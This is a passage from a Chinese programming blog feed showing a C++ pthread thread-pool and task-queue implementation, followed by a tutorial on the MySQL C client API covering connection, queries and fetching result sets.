class="title">AddTask</span><span class="params">(Task task)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">AddTask</span><span class="params">(<span class="type">void</span> (*func)(<span class="type">void</span>* arg), <span class="type">void</span>* arg)</span></span>;</span><br><span class="line">    <span class="function">Task <span class="title">GetTask</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">TaskNumber</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_TaskQueue.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* TaskQueue.cpp */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;TaskQueue.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">TaskQueue::<span class="built_in">TaskQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">pthread_mutex_init</span>(&amp;m_Mutex, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TaskQueue::~<span class="built_in">TaskQueue</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">pthread_mutex_destroy</span>(&amp;m_Mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TaskQueue::AddTask</span><span class="params">(Task task)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">pthread_mutex_lock</span>(&amp;m_Mutex);</span><br><span class="line">    m_TaskQueue.<span class="built_in">push</span>(task);</span><br><span class="line">    <span class="built_in">pthread_mutex_unlock</span>(&amp;m_Mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TaskQueue::AddTask</span><span class="params">(<span class="type">void</span> (*func)(<span class="type">void</span>* arg), <span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">pthread_mutex_lock</span>(&amp;m_Mutex);</span><br><span class="line">    m_TaskQueue.<span class="built_in">push</span>(<span class="built_in">Task</span>(func, arg)); </span><br><span class="line">    <span class="built_in">pthread_mutex_unlock</span>(&amp;m_Mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Task <span class="title">TaskQueue::GetTask</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Task task;</span><br><span class="line">    <span class="built_in">pthread_mutex_lock</span>(&amp;m_Mutex);</span><br><span class="line">    <span class="keyword">if</span> (m_TaskQueue.<span class="built_in">empty</span>() == <span class="literal">false</span>) &#123;</span><br><span class="line">        task = m_TaskQueue.<span class="built_in">front</span>();</span><br><span class="line">        m_TaskQueue.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">pthread_mutex_unlock</span>(&amp;m_Mutex);</span><br><span class="line">    <span class="keyword">return</span> task;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* TaskPool.cpp */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ThreadPool.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">ThreadPool::<span class="built_in">ThreadPool</span>(<span class="type">int</span> min, <span class="type">int</span> max)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        m_TaskQueue = <span class="keyword">new</span> TaskQueue;</span><br><span class="line">        <span class="keyword">if</span> (m_TaskQueue == <span class="literal">nullptr</span>) <span class="keyword">break</span>;</span><br><span class="line">        workers = <span class="keyword">new</span> <span class="type">pthread_t</span>[max];</span><br><span class="line">        <span class="keyword">if</span> (workers == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;new workers fail..&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(workers, <span class="number">0</span>, <span class="built_in">sizeof</span>(<span class="type">pthread_t</span>) * max);</span><br><span class="line">        minimum = min;</span><br><span class="line">        maximum = max;</span><br><span class="line">        busyNum = <span class="number">0</span>;</span><br><span class="line">        liveNum = <span class="number">0</span>;</span><br><span class="line">        exitNum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = <span class="built_in">pthread_mutex_init</span>(&amp;m_Mutex, <span class="literal">NULL</span>);</span><br><span class="line">        res |= <span class="built_in">pthread_cond_init</span>(&amp;m_EmptyCond, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (res != <span class="number">0</span>) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;mutex or cond init fail...&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stop = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">pthread_create</span>(&amp;managerID, <span class="literal">NULL</span>, manager, <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; min; i++) &#123;</span><br><span class="line">            <span class="built_in">pthread_create</span>(&amp;workers[i], <span class="literal">NULL</span>, worker, <span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (workers) <span class="keyword">delete</span>[] workers;</span><br><span class="line">    <span class="keyword">if</span> (m_TaskQueue) <span class="keyword">delete</span> m_TaskQueue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ThreadPool::~<span class="built_in">ThreadPool</span>()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">ThreadPool::worker</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ThreadPool* pool = <span class="built_in">static_cast</span>&lt;ThreadPool*&gt;(arg);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">pthread_mutex_lock</span>(&amp;pool-&gt;m_Mutex);</span><br><span class="line">        <span class="keyword">while</span> (pool-&gt;m_TaskQueue-&gt;<span class="built_in">TaskNumber</span>() == <span class="number">0</span> &amp;&amp; !pool-&gt;stop) &#123;</span><br><span class="line">            <span class="built_in">pthread_cond_wait</span>(&amp;pool-&gt;m_EmptyCond, &amp;pool-&gt;m_Mutex);</span><br><span class="line">            <span class="keyword">if</span> (pool-&gt;exitNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                pool-&gt;exitNum--;</span><br><span class="line">                <span class="keyword">if</span> (pool-&gt;liveNum) &#123;</span><br><span class="line">                    pool-&gt;liveNum--;</span><br><span class="line">                    <span class="built_in">pthread_mutex_unlock</span>(&amp;pool-&gt;m_Mutex);</span><br><span class="line">                    pool-&gt;<span class="built_in">ExitThread</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pool-&gt;stop) &#123;</span><br><span class="line">            <span class="built_in">pthread_mutex_unlock</span>(&amp;pool-&gt;m_Mutex);</span><br><span class="line">            pool-&gt;<span class="built_in">ExitThread</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">pthread_mutex_unlock</span>(&amp;pool-&gt;m_Mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C和C++中的数组是什么</title>
      <link href="/2024/08/23/C%E8%BF%9E%E6%8E%A5MySQL/"/>
      <url>/2024/08/23/C%E8%BF%9E%E6%8E%A5MySQL/</url>
      
        <content type="html"><![CDATA[<p><a href="https://subingwen.cn/mysql/mysql-api/">MySQL API 使用详解 | 爱编程的大丙 (subingwen.cn)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 头文件 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mysql.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">以上api对应的MySQL动态库</span><br><span class="line">    Windows: libmysql.dll</span><br><span class="line">    Linux: libmysqlclient.so</span><br></pre></td></tr></table></figure><p><code>MySQL</code>提供给<code>C</code>的库中所有的函数围绕一个结构体<code>MYSQL</code>，也就是说程序与<code>mysql</code>服务器就是靠这个对象维持连接的，下面给出定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">st_mysql</span> &#123;</span></span><br><span class="line">    NET         net;                <span class="comment">/* 网络通信的相关信息 */</span></span><br><span class="line">    gptr        connector_fd;       <span class="comment">/* 连接器文件描述符 */</span></span><br><span class="line">    <span class="type">char</span>        *host,*user,*passwd,*unix_socket,*server_version,*host_info;</span><br><span class="line">    <span class="type">char</span>        *info, *db;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">charset_info_st</span> *<span class="title">charset</span>;</span><span class="comment">/* 字符集信息 */</span></span><br><span class="line">    MYSQL_FIELD *fields;</span><br><span class="line">    MEM_ROOT    field_alloc;</span><br><span class="line">    my_ulonglong affected_rows;     <span class="comment">/* 受影响的行数 */</span></span><br><span class="line">    my_ulonglong insert_id;         <span class="comment">/* 自增ID */</span></span><br><span class="line">    my_ulonglong extra_info;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> thread_id;        <span class="comment">/* 线程ID */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> packet_length;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> port;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> client_flag, server_capabilities;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> protocol_version;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> field_count;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> server_status;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> server_language;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> warning_count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">st_mysql_options</span> <span class="title">options</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">mysql_status</span> <span class="title">status</span>;</span></span><br><span class="line">    my_bool free_me;                <span class="comment">/* 是否需要释放 */</span></span><br><span class="line">    my_bool reconnect;              <span class="comment">/* 是否重新连接 */</span></span><br><span class="line">    <span class="type">char</span> scramble_buff[SCRAMBLE_LENGTH+<span class="number">1</span>];</span><br><span class="line">    my_bool unused1;</span><br><span class="line">    <span class="type">void</span> *unused2,*unused3,*unused4;</span><br><span class="line">    LIST *stmts;                    <span class="comment">/* SQL语句列表 */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">st_mysql_methods</span> *<span class="title">methods</span>;</span></span><br><span class="line">    <span class="type">void</span> *thd;                      <span class="comment">/* 线程数据 */</span></span><br><span class="line">    my_bool *unbuffered_fetch_owner;</span><br><span class="line">    <span class="type">char</span> *info_buffer;</span><br><span class="line">    <span class="type">void</span> *extension;                <span class="comment">/* 扩展字段 */</span></span><br><span class="line">&#125; MYSQL;</span><br></pre></td></tr></table></figure><h3 id="主要字段说明"><a href="#主要字段说明" class="headerlink" title="主要字段说明"></a>主要字段说明</h3><ul><li><strong><code>NET net</code></strong>: 处理与服务器之间的网络通信。包含套接字描述符、输入&#x2F;输出缓冲区、超时设置等信息。</li><li><strong><code>char *host</code></strong>: 连接的服务器主机名或IP地址。</li><li><strong><code>char *user</code></strong>: 数据库用户名。</li><li><strong><code>char *passwd</code></strong>: 用户密码。</li><li><strong><code>char *unix_socket</code></strong>: Unix域套接字的路径（如果使用）。</li><li><strong><code>char *db</code></strong>: 当前使用的数据库名称。</li><li><strong><code>struct charset_info_st *charset</code></strong>: 指向当前使用字符集的信息结构。</li><li><strong><code>my_ulonglong affected_rows</code></strong>: 最近一次执行的SQL语句影响的行数（适用于 <code>INSERT</code>、<code>UPDATE</code>、<code>DELETE</code> 操作）。</li><li><strong><code>my_ulonglong insert_id</code></strong>: 最近一次插入操作产生的自增ID。</li><li><strong><code>unsigned long thread_id</code></strong>: 当前连接的线程ID。</li><li><strong><code>struct st_mysql_options options</code></strong>: 连接选项的相关结构体，保存了各种连接参数和配置。</li><li><strong><code>enum mysql_status status</code></strong>: 当前连接的状态，如连接中、已关闭等。</li><li><strong><code>my_bool reconnect</code></strong>: 表示是否在连接丢失时自动重连。</li><li><strong><code>LIST *stmts</code></strong>: 保存预处理的SQL语句。</li><li><strong><code>const struct st_mysql_methods *methods</code></strong>: 指向操作MySQL对象的函数指针表，提供了多态性的支持。</li><li><strong><code>void *thd</code></strong>: 线程数据指针，用于存储每个线程的上下文信息。</li><li><strong><code>void *extension</code></strong>: 供未来扩展使用的字段。</li></ul><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><ul><li><code>NET</code> 结构体用于管理网络通信，如读取和写入数据包。</li><li><code>MYSQL_FIELD</code> 结构体用于保存列的信息，如列名、类型等。</li><li>该结构体使用了许多 <code>typedef</code> 类型和复杂的数据结构，如 <code>MEM_ROOT</code>、<code>LIST</code>、<code>my_ulonglong</code> 等，这些都是MySQL内部定义的类型。</li><li><code>methods</code> 字段使用了指向函数的指针表，这使得 <code>MYSQL</code> 结构体可以通过方法表执行不同的操作，实现了一定的面向对象的设计。</li></ul><hr><p>最开始调用的函数**<code>MYSQL* mysql_init(MYSQL* mysql)</code>**，就是为创建一个<code>MYSQL</code>对象在堆区开辟一块空间，并返回这块空间的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数 mysql 可设置为 NULL</span></span><br><span class="line"><span class="comment">// 返回值: 该函数将分配、初始化、并返回新对象</span></span><br><span class="line"><span class="comment">// 通过返回的这个对象去连接MySQL的服务器</span></span><br><span class="line">MYSQL* <span class="title function_">mysql_init</span><span class="params">(MYSQL* mysql)</span> ;</span><br></pre></td></tr></table></figure><p>然后调用**<code>mysql_real_connect()</code>**函数，让上面创建的<code>MYSQL</code>对象与数据库连接。如果连接成功的话，函数返回的是刚刚传入的想要与数据库建立连接的<code>MYSQL</code>对象的地址，表示我们传入的<code>MYSQL</code>对象与数据库连接成功了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">返回值: </span></span><br><span class="line"><span class="comment">    成功: 返回MYSQL*连接句柄, 对于成功的连接，返回值与第1个参数的值相同。返回值指向的内存和第一个参数指针指向的内存一样</span></span><br><span class="line"><span class="comment">    失败，返回NULL。</span></span><br><span class="line"><span class="comment">    句柄: 是windows中的一个概念, 句柄可以理解为一个实例(或者对象)</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line">MYSQL* <span class="title function_">mysql_real_connect</span><span class="params">(</span></span><br><span class="line"><span class="params">    MYSQL *mysql,           <span class="comment">// mysql_init() 函数的返回值</span></span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">char</span> *host,       <span class="comment">// mysql服务器的主机地址, 写IP地址即可</span></span></span><br><span class="line"><span class="params">                            <span class="comment">// localhost, null -&gt; 代表本地连接</span></span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">char</span> *user,       <span class="comment">// 连接mysql服务器的用户名, 默认: root </span></span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">char</span> *passwd,     <span class="comment">// 连接mysql服务器用户对应的密码, root用户的密码</span></span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">char</span> *db,         <span class="comment">// 要使用的数据库的名字</span></span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">int</span> port,      <span class="comment">/* 连接的mysql服务器监听的端口</span></span></span><br><span class="line"><span class="comment"><span class="params">                             如果==0, 使用mysql的默认端口3306, !=0, 使用指定的这个端口*/</span></span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">char</span> *unix_socket,  <span class="comment">// 本地套接字, 不使用指定为 NULL</span></span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">long</span> client_flag <span class="comment">// 通常指定为0</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>成功建立连接后，我们就可以通过这个<code>MYSQL</code>对象用**<code>mysql_query()</code>**函数向<code>mysql</code>服务器发送一些<code>sql</code>语句让服务器去执行，函数执行完后，<code>sql</code>语句的执行结果集仍然存储在远端服务器中等待我们收取。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 执行一个sql语句, 添删查改的sql语句都可以</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mysql_query</span><span class="params">(MYSQL* mysql, <span class="type">const</span> <span class="type">char</span>* query)</span>;</span><br><span class="line">参数:</span><br><span class="line">    - mysql: 成功与某mysql服务器建立连接的MYSQL对象的地址</span><br><span class="line">    - query: 一个可以执行的sql语句, 语句结尾不需要加 <span class="string">&#x27;;&#x27;</span></span><br><span class="line">返回值: </span><br><span class="line">    - 如果查询成功，返回<span class="number">0</span>。</span><br><span class="line">    - 如果出现错误，返回非<span class="number">0</span>值。 </span><br></pre></td></tr></table></figure><hr><p>服务器成功执行<code>sql</code>语句后，执行的结果集需要我们调用**<code>mysql_store_result()</code>**函数将结果集从远端接收到客户端内存中。这个函数会创建一个<code>MYSQL_RES</code>对象来存储收到的结果集，大概可以想成一个表格吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数是刚刚执行查询语句的 MYSQL对象地址</span></span><br><span class="line"><span class="comment">// MYSQL_RES 对应一块内存, 里边保存着这个查询之后得到的结果集</span></span><br><span class="line"><span class="comment">// 如何将行和列的数据从结果集中取出, 需要使用其他函数</span></span><br><span class="line"><span class="comment">// 返回值: 具有多个结果的MYSQL_RES结果集合。如果出现错误，返回NULL。 </span></span><br><span class="line">MYSQL_RES* <span class="title function_">mysql_store_result</span><span class="params">(MYSQL* mysql)</span>;</span><br></pre></td></tr></table></figure><p>下面的函数就是用来处理<code>MYSQL_RES</code>对象的函数</p><p><strong><code>mysql_num_fields()</code></strong></p><p>获取字段的个数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从结果集中列的个数</span></span><br><span class="line"><span class="comment">// 参数: 调用 mysql_store_result() 得到的返回值</span></span><br><span class="line"><span class="comment">// 返回值: 结果集中的列数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">mysql_num_fields</span><span class="params">(MYSQL_RES *result)</span></span><br></pre></td></tr></table></figure><p><strong><code>mysql_fetch_fields()</code></strong></p><p>获取所有字段的名称</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过这个函数得到结果集中所有列(字段)的名字</span></span><br><span class="line"><span class="comment">// 参数: 调用 mysql_store_result() 得到的返回值</span></span><br><span class="line"><span class="comment">// 返回值: MYSQL_FIELD* 指向一个结构体数组的起始地址</span></span><br><span class="line"><span class="comment">// 通过查询官方文档, 返回是一个结构体的数组</span></span><br><span class="line">MYSQL_FIELD* <span class="title function_">mysql_fetch_fields</span><span class="params">(MYSQL_RES* result)</span>;</span><br></pre></td></tr></table></figure><p><code>FIELD</code>表示一个字段，用**<code>MYSQL_FIELD</code>**结构体描述一个字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mysql.h</span></span><br><span class="line"><span class="comment">// 结果集中的每一个列对应一个 MYSQL_FIELD</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">st_mysql_field</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name;                 <span class="comment">/* 列名 或者说 字段的名字 */</span></span><br><span class="line">  <span class="type">char</span> *org_name;             <span class="comment">/* Original column name, if an alias */</span></span><br><span class="line">  <span class="type">char</span> *table;                <span class="comment">/* Table of column if column was a field */</span></span><br><span class="line">  <span class="type">char</span> *org_table;            <span class="comment">/* Org table name, if table was an alias */</span></span><br><span class="line">  <span class="type">char</span> *db;                   <span class="comment">/* Database for table */</span></span><br><span class="line">  <span class="type">char</span> *catalog;              <span class="comment">/* Catalog for table */</span></span><br><span class="line">  <span class="type">char</span> *def;                  <span class="comment">/* Default value (set by mysql_list_fields) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> length;       <span class="comment">/* Width of column (create length) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> max_length;   <span class="comment">/* Max width for selected set */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> name_length;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> org_name_length;                                                                                        </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> table_length;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> org_table_length;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> db_length;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> catalog_length;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> def_length;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;         <span class="comment">/* Div flags */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> decimals;      <span class="comment">/* Number of decimals in field */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> charsetnr;     <span class="comment">/* Character set */</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">enum_field_types</span> <span class="title">type</span>;</span> <span class="comment">/* Type of field. See mysql_com.h for types */</span></span><br><span class="line">  <span class="type">void</span> *extension;</span><br><span class="line">&#125; MYSQL_FIELD;</span><br></pre></td></tr></table></figure><p>打印结果集的所有字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 得到存储头信息的数组的地址</span></span><br><span class="line">MYSQL_FIELD* fields = mysql_fetch_fields(res);</span><br><span class="line"><span class="comment">// 得到列数</span></span><br><span class="line"><span class="type">int</span> num = mysql_num_fields(res);</span><br><span class="line"><span class="comment">// 遍历得到每一列的列名</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;当前列的名字: %s\n&quot;</span>, fields[i].name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>mysql_fetch_row()</code></strong></p><p>获取下一条记录</p><p>函数在调用时，最初指向的行是结果集的第一行之前。也就是说，当你第一次调用 mysql_fetch_row() 时，它会移动到结果集的第一行并返回该行的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">char</span>** MYSQL_ROW;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">        &quot;value1&quot;       &quot;value2&quot;</span></span><br><span class="line"><span class="comment">           ^               ^</span></span><br><span class="line"><span class="comment">           |               |</span></span><br><span class="line"><span class="comment"> ROW     char* value1   value2</span></span><br><span class="line"><span class="comment">           ^</span></span><br><span class="line"><span class="comment">           |</span></span><br><span 